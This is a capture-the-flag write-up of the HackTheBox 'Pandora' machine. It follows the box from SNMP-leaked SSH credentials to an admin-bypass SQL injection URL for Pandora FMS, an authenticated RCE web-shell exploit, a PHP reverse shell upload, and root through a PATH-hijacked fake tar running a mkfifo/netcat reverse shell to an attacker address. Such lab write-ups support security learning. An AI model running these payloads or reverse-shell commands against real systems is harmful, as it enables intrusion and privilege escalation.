## Pandora

![[Pasted image 20230131224127.png]]

### A boot to root report from `somesecurityguy`

---
## Synopsis

Pandora is an easy difficulty box from HackTheBox. Initial access is acheived by finding leaked credentials from SNMP, which leaks credentials used to access SSH as the user `daniel`. After some enumeration it is discovered that there's another website being served on the local machine.  We then use our ssh access to create a tunnel to gain access to this website and find that it's possible to authenticate as admin on the webserver via a known exploit with the application being served. Once authenticated, we find a file manager and upload a malicious php reverse shell, and make our way to user `matt`. Gaining `root` access is acheived after finding a relative path coded into a custom binary that has the SUID bit set and hijacking the PATH to have the binary run a custom script in the `/tmp` directory instead of the real binary.

---
## Port Scans

nmap all open TCP ports
```shell
┌──(kali㉿kali)-[~]
└─$ nmap -p- -T4 10.10.11.136
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 12:32 EST
Nmap scan report for 10.10.11.136
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 23.14 seconds

```

nmap TCP Service enumeration
```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.11.136 -p22,80
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 12:35 EST
Nmap scan report for 10.10.11.136
Host is up (0.040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24c295a5c30b3ff3173c68d7af2b5338 (RSA)
|   256 b1417799469a6c5dd2982fc0329ace03 (ECDSA)
|_  256 e736433ba9478a190158b2bc89f65108 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.38 seconds
```

UDP Top 200:
```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sU -T4 10.10.11.136 --top-ports 200
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 12:32 EST
Nmap scan report for 10.10.11.136
Host is up (0.040s latency).
Not shown: 174 closed udp ports (port-unreach)
PORT      STATE         SERVICE
19/udp    open|filtered chargen
158/udp   open|filtered pcmail-srv
161/udp   open          snmp
192/udp   open|filtered osu-nms
389/udp   open|filtered ldap
518/udp   open|filtered ntalk
520/udp   open|filtered route
683/udp   open|filtered corba-iiop
1025/udp  open|filtered blackjack
1029/udp  open|filtered solid-mux
1036/udp  open|filtered nsstp
1039/udp  open|filtered sbl
1044/udp  open|filtered dcutility
1719/udp  open|filtered h323gatestat
2222/udp  open|filtered msantipiracy
3456/udp  open|filtered IISrpc-or-vat
5093/udp  open|filtered sentinel-lm
5632/udp  open|filtered pcanywherestat
9200/udp  open|filtered wap-wsp
17185/udp open|filtered wdbrpc
34861/udp open|filtered unknown
49154/udp open|filtered unknown
49158/udp open|filtered unknown
49188/udp open|filtered unknown
49191/udp open|filtered unknown
49199/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 182.63 seconds
```

---
## TCP Port Enumeration

### Port 22 (OpenSSH)
Nothing of note.

### Port 80 (Apache httpd 2.4.41)
![[Pasted image 20230131124106.png]]


## UDP Port Enumeration

### Port 161 (SNMP)
- Significant information disclosure via SNMP including:
	- command line arguments for processes
	- installed software
	- local services
	- password disclosure

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sU -sC -sV -p19,158,161,192,389,518,520,683,1025,1029,1036,1039,1044,1719,2222,3456,5093,5632,9200,17185,34861,49154,49158,49188,49191,49199 10.10.11.136
[sudo] password for kali: 
Sorry, try again.
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 12:39 EST
Nmap scan report for 10.10.11.136
Host is up (0.040s latency).

PORT      STATE  SERVICE        VERSION
19/udp    closed chargen
158/udp   closed pcmail-srv
161/udp   open   snmp           SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-win32-software: 
|   accountsservice_0.6.55-0ubuntu12~20.04.5_amd64; 2021-12-07T12:57:21
...
| snmp-processes: 
|   1: 
|     Name: systemd
|     Path: /sbin/init
|     Params: maybe-ubiquity
|   2: 
|     Name: kthreadd
...
|   852: 
|     Name: sh
|     Path: /bin/sh
|     Params: -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
...
|   1136: 
|     Name: host_check
|     Path: /usr/bin/host_check
|     Params: -u daniel -p HotelBabylon23
...
| snmp-netstat: 
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  10.10.11.136:47462   1.1.1.1:53
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:161          *:*
|_  UDP  127.0.0.53:53        *:*
```

---

## Initial Access

Initial access as user `daniel` made possible with SNMP information leakage.
![[Pasted image 20230131125103.png]]

---

## Local Enumeration

### Users from `/etc/passwd`
```c
matt:x:1000:1000:matt:/home/matt:/bin/bash
daniel:x:1001:1001::/home/daniel:/bin/bash
```

Not many interesting writable files, scripts, etc. were found in searching for about 10 minutes.

### Apache Sites-available
`pandora.conf`
- Internal only website hosted
```c
daniel@pandora:/etc/apache2/sites-available$ cat pandora.conf
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

### Local Port Forwarding via ssh to gain access to local site.
- Forwarding 1080 on localhost to port 80 on panda.htb
```shell
┌──(kali㉿kali)-[~]
└─$ ssh -L 1080:localhost:80 daniel@10.10.11.136  
```

## Internal Website Enumeration

![[Pasted image 20230131215937.png]]

- Pandora FMS v 7.0NG.742_FIX_PERL2020
- Found article on potential vulnerability on this page https://cve.report/CVE-2021-32099 (which also, unfortunately has a spoiler for this box on it)
- Just entering the following URL will trick the application into authenticating your session as `admin`
```
http://localhost:1080/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
```

---

## Exploitation

### Pivoting to user `matt` by gaining RCE via webshell generated by following exploit:
```
┌──(kali㉿kali)-[~]
└─$ searchsploit -m 50961    
  Exploit: Pandora FMS v7.0NG.742 - Remote Code Execution (RCE) (Authenticated)
      URL: https://www.exploit-db.com/exploits/50961
     Path: /usr/share/exploitdb/exploits/php/webapps/50961.py
    Codes: CVE-2020-5844
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (1384)
Copied to: /home/kali/50961.py
```

#### 50961.py output
```shell
┌──(kali㉿kali)-[~]
└─$ python 50961.py -t localhost 1080 -p snka5scpru91e43eu55164cm0r                  

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2020-5844 (Pandora FMS v7.0NG.742) - Remote Code Execution
OPTIONS: Web Shell Mode
PHPSESS: snka5scpru91e43eu55164cm0r
WEBFILE: unicord.php
WEBSITE: http://localhost:1080/pandora_console
EXPLOIT: Connected to website! Status Code: 200
EXPLOIT: Logged into Pandora FMS!
EXPLOIT: Web shell uploaded!
SUCCESS: Web shell available at: http://localhost:1080/pandora_console/images/unicord.php?cmd=whoami 
```

## Successful pivot to user `matt`

### Reverse shell not working with RCE for some reason. 
- I didn't feel like playing around with the web shell as I had some issues with it actually executing files I had it retrieve with wget so I went investigating for another means.
- Web application has file upload via Admin -> File Manager!
- Uploaded php-reverse-shell.php 
![[Pasted image 20230131135834.png]]

Let's visit http://localhost:1080/pandora_console/images/php-reverse-shell.php and setup our listener...

### Reverse Shell as user `matt`
![[Pasted image 20230131140126.png]]

---

## Privilege Escalation

### SUID bit set on /usr/bin/pandora_backup
```
matt@pandora:/home/matt$ find / -perm -4000 -ls 2>/dev/null
find / -perm -4000 -ls 2>/dev/null
   264644    164 -rwsr-xr-x   1 root     root       166056 Jan 19  2021 /usr/bin/sudo
   265010     32 -rwsr-xr-x   1 root     root        31032 May 26  2021 /usr/bin/pkexec
   267386     84 -rwsr-xr-x   1 root     root        85064 Jul 14  2021 /usr/bin/chfn
   262764     44 -rwsr-xr-x   1 root     root        44784 Jul 14  2021 /usr/bin/newgrp
   267389     88 -rwsr-xr-x   1 root     root        88464 Jul 14  2021 /usr/bin/gpasswd
   264713     40 -rwsr-xr-x   1 root     root        39144 Jul 21  2020 /usr/bin/umount
   262929     20 -rwsr-x---   1 root     matt        16816 Dec  3  2021 /usr/bin/pandora_backup
```

Using `cat` on `/usr/bin/pandora_backup` reveals that it's backing up some files to `/root` from `/var/www/pandora/pandora_console/` but it fails on execution. It looks like we're in a restricted shell:
```
matt@pandora:/var/www/pandora/pandora_console$ echo $TERM
echo $TERM
dumb
```

Let's break out of this shell with `at` since it has SUID bit set as well.

```
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```


Let's take a closer look at what this script does and see if there's anything useful we can do with it.

- Output of cat /usr/bin/pandora_backup
```
MS Backup UtilityNow attempting to backup PandoraFMS clienttar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*Backup failed!
Check your permissions!Backup successful!Terminating program!<(�������������X}�������h���8zRx

```

It seems whoever wrote this did not use an absolute path for tar and I missed this on my first peek at it. Knowing this, we can use intercept the path by changing the PATH environment variable to include a path to our own custom version of the `tar` binary
```
$ export PATH=/tmp:$PATH
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.13 3333" >/tmp/tar
$ chmod +x /tmp/tar
```

When a command is executed without using an absolute (`absolute: /usr/bin/tar vs relative: tar`) path, it first checks to see if that binary is located anywhere in the PATH environment variable and it checks in order from the first section of the PATH to the last section. By prepending `/tmp` at the beginning we've essentially taken over that binary with our own since it will be ran before the actual binary the author of the `/usr/bin/pandora_backup` author intended. And since the SUID bit is set and owned by root, our binary will be ran by the `root` user. 

```
$ cat /tmp/tar
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.13 3333

$ /usr/bin/pandora_backup
...
```

Now we wait with a listener on port 3333
```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 3333        
listening on [any] 3333 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.136] 43814
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=1000(matt) groups=1000(matt)
# whoami
root
# cat /root/root.txt
[REDACTED]

```

---
## Loot

- user.txt
- root.txt